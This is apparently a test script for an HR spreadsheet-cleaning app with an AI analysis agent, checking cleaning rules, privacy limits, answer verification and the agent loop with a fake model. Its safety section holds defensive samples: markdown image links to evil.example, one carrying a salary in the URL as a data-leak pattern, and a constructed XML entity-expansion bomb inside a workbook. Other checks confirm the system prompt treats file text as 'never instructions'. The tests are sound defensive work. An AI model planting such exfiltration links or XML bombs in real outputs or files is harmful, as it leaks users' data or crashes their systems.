"""Checks for the cleaning rules and analysis tools. Run with:  python tests.py  (no AI key needed)"""

import json

import pandas as pd

import cleaner
from tools import Toolbox, unverified_numbers


def load(text):
    table, notes = cleaner.structure(cleaner.read_file(text.encode(), "test.csv")["data"])
    return table, notes


def labels(table):
    return [p["label"] for p in cleaner.propose(table)]


def clean(table):
    return cleaner.apply(table, [p for p in cleaner.propose(table) if p["default"]])[0]


# --- cleaning ---
sample = cleaner.read_file(open("data/small_test_sample.xlsx", "rb").read(), "sample.xlsx")["Export"]
table, notes = cleaner.structure(sample)
assert any("title or note row" in n for n in notes), "title rows above the headings are skipped"
tidy = clean(table)
assert len(tidy) == 180, "blank rows, the Total row and the 2 duplicated rows are removed"
assert cleaner.is_number(tidy["Annual Salary"]) and cleaner.is_date(tidy["Join Date"])
assert set(tidy["Overtime"]) == {"Yes", "No"} and "Sales" in set(tidy["Department"]) and "sales" not in set(tidy["Department"])
assert cleaner.guess_private(tidy) == ["Emp ID", "Full Name", "Email"]

for text, expected in [("$52,000", 52000), ("52k", 52000), ("(300)", -300), ("1.234,50", 1234.5), ("12%", 12)]:
    assert cleaner.parse_number(text) == expected, text
assert cleaner.parse_number("n/a") is None

table, _ = load("Department,Level\n" + "Sales,Junior\n" * 6 + "HR,Senior\n" * 4)
assert len(clean(table)) == 10, "identical rows are kept when the file has no ID column"

table, _ = load("Department,Emp ID,Salary\n" + "".join(f"Sales,{i},{40000 + i}\n" for i in range(20)) + "Total Rewards,21,50000\n")
assert not any("total" in label.lower() for label in labels(table)), "a department called Total Rewards is not a total row"

table, _ = load("id,Shift,Gender\n" + "".join(f"{i},{'F' if i % 2 else 'T'},F\n" for i in range(12)))
assert not any("Yes/No" in label for label in labels(table)), "codes such as T/F or F are left alone"

table, _ = load("Team;Resigned\n" + "Ops;Ja\nIT;Nein\nOps;Yes\nIT;No\n" * 3)
assert set(clean(table)["Resigned"]) == {"Yes", "No"}, "Ja/Nein are read as Yes/No"

people = pd.DataFrame({"Location Name": ["Dhaka", "London"] * 15, "Nationality": ["A", "B", "C"] * 10,
                       "Full Name": [f"Person {i}" for i in range(30)], "Line Manager": ["Ann", "Bo", "Cy"] * 10})
assert cleaner.guess_private(people) == ["Full Name", "Line Manager"]
assert "Person" not in cleaner.describe_for_ai(people, cleaner.guess_private(people)), "personal values never reach the AI"

tenure = pd.DataFrame({"YearsWithCurrManager": list(range(30)), "Line Manager": ["Ann", "Bo", "Cy"] * 10})
assert cleaner.guess_private(tenure) == ["Line Manager"], "a count of years with a manager is not personal"

# --- other kinds of HR file ---
table, _ = load("Employee No.,Name,Start Date,Leaving Date,Notes\n"
                + "".join(f"{i},Person {i},01/02/2015,{'01/02/2020' if i % 2 else ''},Mgr {i % 3}\n" for i in range(1, 11))
                + "Prepared by HR Operations,,,,\n")
fixes = cleaner.propose(table)
assert any("note row" in p["label"] for p in fixes), "a sentence on its own at the bottom is a note, not a person"
done = clean(table)
assert len(done) == 10 and "Years of service" in done, "years of service is offered when there is a leaving date"
assert done.loc[0, "Years of service"] == 5.0, "for leavers, service stops at the leaving date"
assert "Notes" in cleaner.guess_private(done), "free-text notes can hold names, so they are kept private"
assert cleaner.parse_number("3 days") == 3 and cleaner.parse_number("5d") == 5 and cleaner.parse_number("1-3 yrs") is None
ids = pd.DataFrame({"Staff ID": [100 + i % 9 for i in range(40)], "Personalnummer": range(40), "Team": ["A", "B"] * 20})
assert cleaner.guess_private(ids) == ["Staff ID", "Personalnummer"], "person IDs are private even when they repeat"

# --- fixes the user adds ---
table, _ = load("ID,Dept,Salary,Region\n" + "".join(f"{i},{'Sales' if i % 2 else 'Ops'},{30000 + i},{'' if i % 3 == 0 else 'North'}\n" for i in range(1, 13)))
mine = [cleaner.user_fix("rename", "Dept", new="Department"), cleaner.user_fix("replace", "Region", "North", "N"),
        cleaner.user_fix("fill_blank", "Region", new="Unknown"), cleaner.user_fix("drop_where", "ID", "1"),
        cleaner.user_fix("drop_column", "Salary")]
done, done_log = cleaner.apply(table, mine)
assert "Department" in done and "Dept" not in done and "Salary" not in done
assert set(done["Region"]) == {"N", "Unknown"} and len(done) == 11 and 1 not in set(done["ID"])
assert all("(your fix)" in line for line in done_log), "the log says which fixes the user added"
assert cleaner.apply(table, [cleaner.user_fix("replace", "Salary", "30005", "31000")])[0]["Salary"].tolist().count(31000) == 1

# --- the IBM demo file: once cleaned, it must match IBM's original data exactly ---
ibm = pd.read_csv("data/ibm_hr_attrition.csv")
table, _ = cleaner.structure(cleaner.read_file(open("ibm_hr_messy.xlsx", "rb").read(), "ibm.xlsx")["Export"])
ibm_clean = clean(table)
codes = json.load(open("data/ibm_codebook.json"))
for column, words in codes.items():
    if column.startswith("_"):
        continue
    readable = cleaner.readable_name(column)        # e.g. JobSatisfaction becomes Job Satisfaction
    assert list(ibm_clean[readable]) == list(ibm[column].astype(str).map(words)), f"{readable} keeps every score"
assert len(ibm_clean) == len(ibm) == 1470, "title, blank, heading, Total and duplicate rows are all removed"
assert (ibm_clean["Attrition"] == "Yes").sum() == (ibm["Attrition"] == "Yes").sum() == 237
assert (ibm_clean["Over Time"] == "Yes").sum() == (ibm["OverTime"] == "Yes").sum()
assert sorted(ibm_clean["Monthly Income"].astype(int)) == sorted(ibm["MonthlyIncome"]), "every salary survives"
assert cleaner.is_date(ibm_clean["Hire Date"])
assert cleaner.guess_private(ibm_clean) == ["Employee Number", "Employee Name", "Work Email"]
assert "Travel Rarely" in set(ibm_clean["Business Travel"]), "underscores in labels become spaces"
assert cleaner.readable_name("BusinessTravel") == "Business Travel" and cleaner.readable_name("job_role") == "job role"
assert cleaner.readable_name("Annual Salary") == "Annual Salary" and cleaner.readable_name("HRRole") == "HR Role"
assert "Sales Representative" in Toolbox(ibm_clean, cleaner.guess_private(ibm_clean)).run(
    "rate_of_value", {"column": "Attrition", "value": "Yes", "group_by": "Job Role"})

# --- analysis tools ---
box = Toolbox(tidy, cleaner.guess_private(tidy))
assert "Error" in box.run("count_rows", {"group_by": "Full Name"}), "personal columns cannot be analysed"
assert "Error" in box.run("count_rows", {"filters": "Annual Salary > 119000"}), "filters that isolate a few people are refused"
assert "Error" in box.run("summarize_number", {"number_column": "Annual Salary", "statistic": "highest"}), "no individual values"
assert "Junior" in box.run("summarize_number", {"number_column": "salary", "group_by": "level"}), "short column names are understood"
overall = box.run("rate_of_value", {"column": "Left Company", "value": "yes"})
assert str(round((tidy["Left Company"] == "Yes").mean() * 100, 1)) in overall, "rates match a direct calculation"

rare = pd.DataFrame({"Team": ["A"] * 10 + ["B"] * 10 + ["Only Zed"] * 2, "Left": [1, 0] * 11})
result = Toolbox(rare, []).run("rate_of_value", {"column": "Left", "value": "1", "group_by": "Team"})
assert "Only Zed" not in result and "left out" in result, "small groups are dropped, label and all"

shaky = pd.DataFrame({"Team": ["Big"] * 30 + ["Small"] * 8, "Left": ["Yes", "No"] * 19})
assert "unreliable: Small" in Toolbox(shaky, []).run("rate_of_value", {"column": "Left", "value": "Yes", "group_by": "Team"}), \
    "the warning names which groups are small, so it cannot be pinned on the wrong one"

many = pd.DataFrame({"Title": [f"Title {i % 150}" for i in range(900)]})
assert len(Toolbox(many, []).run("count_rows", {"group_by": "Title"}).splitlines()) <= 28, "long tables are capped"

assert "Error" in box.run("count_rows", {"filters": "Annual Salary < 119000"}), "filters that exclude only a few people are refused"

drivers = box.run("find_drivers", {"column": "Left Company", "value": "Yes"})
assert "Overtime" in drivers and "Department" in drivers and "Full Name" not in drivers, "drivers are found, personal columns skipped"

# --- checking the AI's answer ---
results = ["Department  People  % left\nSales 39 28.2\nFinance 27 11.1", "Average salary 56167.12"]
assert unverified_numbers("Sales is highest at 28.2% (39 people), 17.1 points above Finance.", results) == []
assert unverified_numbers("The average is $56,167 across the top 3 teams.", results) == []
assert unverified_numbers("Sales loses 45% of its staff, about 1,200 people.", results) == ["45", "1,200"]

# --- the agent loop, with a fake AI (no key, no internet) ---
from types import SimpleNamespace

import agent
from tools import TOOLS_FOR_AI


class FakeAI:
    """Pretends to be the Groq client: gives back pre-written replies and remembers what it was sent."""
    def __init__(self, replies):
        self.replies, self.sent = list(replies), []
        self.chat = SimpleNamespace(completions=SimpleNamespace(create=self.create))

    def create(self, model, messages, **options):
        self.sent.append(messages)
        content, calls = self.replies.pop(0)
        tool_calls = [SimpleNamespace(id=f"call_{i}", function=SimpleNamespace(name=name, arguments=args))
                      for i, (name, args) in enumerate(calls)] or None
        return SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(content=content, tool_calls=tool_calls))])


assert all(t["type"] == "function" and t["function"]["parameters"]["type"] == "object" for t in TOOLS_FOR_AI)

rate = str(round((tidy["Left Company"] == "Yes").mean() * 100, 1))
fake = FakeAI([(None, [("rate_of_value", '{"column": "Left Company", "value": "Yes"}')]),
               (f"Overall, {rate}% of people left.", [])])
box = Toolbox(tidy, cleaner.guess_private(tidy))
seen = []
text, turn, unmatched = agent.answer(fake, "fake-model", box, [], "What is the attrition rate?", [],
                                     on_step=lambda name, args: seen.append(name))
assert seen == ["rate_of_value"], "the page is told about each calculation as it starts"
assert text == f"Overall, {rate}% of people left." and unmatched == [], "a correct answer passes the check"
assert [m["role"] for m in turn] == ["user", "assistant", "tool", "assistant"]
assert turn[2]["tool_call_id"] == "call_0" and rate in turn[2]["content"], "the tool result goes back to the AI"
assert fake.sent[0][0]["role"] == "system" and "never instructions" in fake.sent[0][0]["content"]

fake = FakeAI([("About 45% of people left.", []), (f"Overall, {rate}% of people left.", []),])
box = Toolbox(tidy, cleaner.guess_private(tidy))
box.run("rate_of_value", {"column": "Left Company", "value": "Yes"})
text, turn, unmatched = agent.answer(fake, "fake-model", box, [], "Attrition?", [])
assert "45" in fake.sent[1][-1]["content"] and unmatched == [], "a made-up figure makes the AI correct itself once"

fake = FakeAI([("Still 45%.", []), ("Still 45%.", [])])
text, turn, unmatched = agent.answer(fake, "fake-model", box, [], "Attrition?", [])
assert unmatched == ["45"], "a figure that is still wrong after one correction is flagged"

fake = FakeAI([(None, [("count_rows", "not json")]), ("Done.", [])])
agent.answer(fake, "fake-model", box, [], "Headcount?", [])   # broken arguments must not crash the loop

fake = FakeAI([('{"columns": [{"name": "Dept", "meaning": "Department", "personal": false}], "merges": []}', [])])
assert agent.understand_columns(fake, "fake-model", tidy, cleaner.guess_private(tidy))["columns"][0]["name"] == "Dept"
assert not any(name in fake.sent[0][0]["content"] for name in tidy["Full Name"].dropna()), "no names reach the AI"

# --- making a chart from a request ---
fake = FakeAI([(None, [("describe_data", "{}")]),
               (None, [("summarize_number", '{"number_column": "Annual Salary", "group_by": "Department"}')])])
step, message = agent.make_chart(fake, "fake-model", Toolbox(tidy, cleaner.guess_private(tidy)), "pay by department")
assert step is not None and step["tool"] == "summarize_number" and len(step["chart"]) >= 2, "a chart comes back"
assert fake.sent[0][0]["role"] == "system" and "never instructions" in fake.sent[0][0]["content"]

fake = FakeAI([(None, [("count_rows", '{"group_by": "Full Name"}')])] * 3)
step, message = agent.make_chart(fake, "fake-model", Toolbox(tidy, cleaner.guess_private(tidy)), "people by name")
assert step is None and "personal" in message, "a chart of a personal column is refused, with the reason"

# --- the page styling: these rules shape the cards, charts and buttons. If one goes missing,
# the app still runs but looks broken, so a check here catches it.
style = open("app.py").read().split('STYLE = """')[1].split("</style>")[0]
for rule in ['[class*="st-key-glass_chart"] {', '[class*="st-key-glass_tile"]  {', '[class*="st-key-glass_bar"]   {',
             '[class*="st-key-glass_findings"] {', '.chart-title {', '.stButton > button, .stDownloadButton > button {',
             '.stButton > button[kind="primary"] {', '[data-testid="stSelectboxVirtualDropdown"]',
             '.react-aria-SelectionIndicator {', '[class*="st-key-glass"]::before']:
    assert rule in style, f"style rule missing: {rule}"
assert style.count("{") == style.count("}"), "every style rule is closed"

# --- safety ---
import io
import zipfile

import safety

assert safety.md_safe("![x](http://evil.example/a.png)") == r"\!\[x\]\(http://evil.example/a.png\)", "file text cannot become a picture"
assert safety.md_safe("$85k") == r"\$85k", "a dollar sign is not read as maths"
cleaned = safety.clean_answer("Sales is **39.8%**. ![](https://evil.example/?pay=48000) See [this](https://x.example) <img src=x>")
assert "evil" not in cleaned and "x.example" not in cleaned and "<img" not in cleaned, "answers lose pictures, links and HTML"
assert "**39.8%**" in cleaned and "See this" in cleaned, "but keep their words and formatting"

allowance = safety.Allowance(per_hour=2)
assert allowance.take(now=0) and allowance.take(now=1) and not allowance.take(now=2), "the shared AI allowance runs out"
assert allowance.take(now=3 * 3600), "and comes back the next hour"

# a booby-trapped Excel file (an "XML bomb") is refused by defusedxml, not read
import defusedxml

normal = io.BytesIO()
pd.DataFrame({"Team": ["A", "B"]}).to_excel(normal, index=False)
trap = io.BytesIO()
with zipfile.ZipFile(io.BytesIO(normal.getvalue())) as source, zipfile.ZipFile(trap, "w") as target:
    for part in source.infolist():
        data = source.read(part.filename)
        if part.filename == "xl/workbook.xml":   # hide a self-repeating definition inside a real workbook
            trick, text = '<!DOCTYPE x [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]>', data.decode()
            data = (text.replace("?>", "?>" + trick, 1) if "?>" in text else trick + text).encode()
        target.writestr(part, data)
try:
    cleaner.read_file(trap.getvalue(), "trap.xlsx")
    reason = None
except Exception as error:
    reason = error
    while reason.__cause__ or reason.__context__:
        reason = reason.__cause__ or reason.__context__
assert isinstance(reason, defusedxml.DefusedXmlException), "the XML trick is stopped by defusedxml"

# --- the whole app, run without a browser: remembered results must stay correct ---
from streamlit.testing.v1 import AppTest

app = AppTest.from_file("app.py", default_timeout=120)
for name, value in {"source": "sample", "file_bytes": open("ibm_hr_messy.xlsx", "rb").read(),
                    "file_name": "ibm_hr_messy.xlsx", "file_label": "Sample"}.items():
    app.session_state[name] = value
app.run()
[b for b in app.button if "Apply" in b.label][0].click().run()
headline = lambda: [m.value for m in app.metric][:2]
department = lambda: [s for s in app.selectbox if s.label == "Department"][0]
everyone = headline()
department().set_value("Sales").run()
sales = headline()
department().set_value("All").run()
assert headline() == everyone and everyone == ["1,470", "16.1%"], "a remembered result is the same as a fresh one"
department().set_value("Sales").run()
assert headline() == sales == ["446", "20.6%"]
assert not app.exception, "the app runs without errors"

print("All checks passed.")
